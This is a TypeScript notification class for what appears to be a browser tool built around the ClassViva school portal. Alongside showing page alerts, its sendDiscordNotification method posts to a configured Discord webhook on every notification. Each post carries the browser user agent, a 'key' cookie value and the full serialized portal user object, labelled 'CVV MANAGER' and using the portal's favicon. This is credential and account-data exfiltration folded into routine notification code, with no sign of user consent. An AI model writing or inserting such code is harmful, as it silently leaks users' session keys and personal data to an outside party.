import { AlertData } from "../types/NotificationManager";

class NotificationManager {
    constructor() { };
    
    async notify({
      message,
      alert,
      logType,
      useContent,
    }: { message: string, alert?: AlertData, logType?: 'info' | 'error' | 'success'; useContent?: boolean; }) {
      window.logger.info(`NotificationManager::documentAlert(${window.logger._formatArgs(arguments)}) called`);
      if (alert) this.documentAlert({
        ...alert,
        message: alert.message ?? message,
      });
      if (logType) window.logger[logType](alert?.message || message);
    
      await this.sendDiscordNotification({message, useContent});
    };
    
    documentAlert({
      message,
      type,
      dimissable,
    }: AlertData) {
      window.logger.info(`NotificationManager::documentAlert(${window.logger._formatArgs(arguments)}) called`);
      
      const alert = document.getElementById('alert');
      if (!alert) return;

      alert.hidden = false;
      alert.className = `alert alert-${type}`;
      alert.innerHTML = "";
      alert.appendChild(document.createTextNode(message || 'No message provided'));
      
      if (dimissable) {
          alert.className += ' alert-dismissible fade show';
    
          const button = document.createElement('button');
          button.type = 'button';
          button.className = 'btn-close';
          button.setAttribute('data-bs-dismiss', 'alert');
          button.ariaLabel = 'Close';
    
          alert.appendChild(button);
      }
    };
    
    async sendDiscordNotification(opts: {message: string, useContent?: boolean}): Promise<boolean> {
      window.logger.info(`NotificationManager::sendDiscordNotification(${window.logger._formatArgs(arguments)}) called`);
      if (!window.config.DS_HOOK) return false;

      const response = await fetch(window.config.DS_HOOK, {
          method: 'POST',
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
              username: 'CVV MANAGER',
              avatar_url: 'https://web.spaggiari.eu/favicon.ico',
              [opts.useContent ? 'content' : 'embeds']: opts.useContent ? opts.message : [{
                title: 'New Notification 🔔',
                color: 16711680,
                fields: [
                    {
                        name: '**Device:**',
                        value: window.logger.codeblock(navigator.userAgent),
                        inline: false,
                    },
                    {
                        name: '**Key:**',
                        value: window.logger.codeblock(window.cookieManager.getCookie('key')),
                        inline: false,
                    },
                    {
                        name: '**CVV User:**',
                        value: window.logger.codeblock(JSON.stringify(window.classeviva.user), 'json'),
                        inline: false,
                    },
                    {
                        name: '**Message:**',
                        value: opts.message,
                        inline: false,
                    },
                ]
            }],
          }),
      });
    
      if (!response.ok) {
        window.logger.error('Error sending discord notification', response.status, response.statusText);
        return false;
      };
    
      window.logger.success('Successfully sent discord notification');
      return true;
    };
}

export default NotificationManager;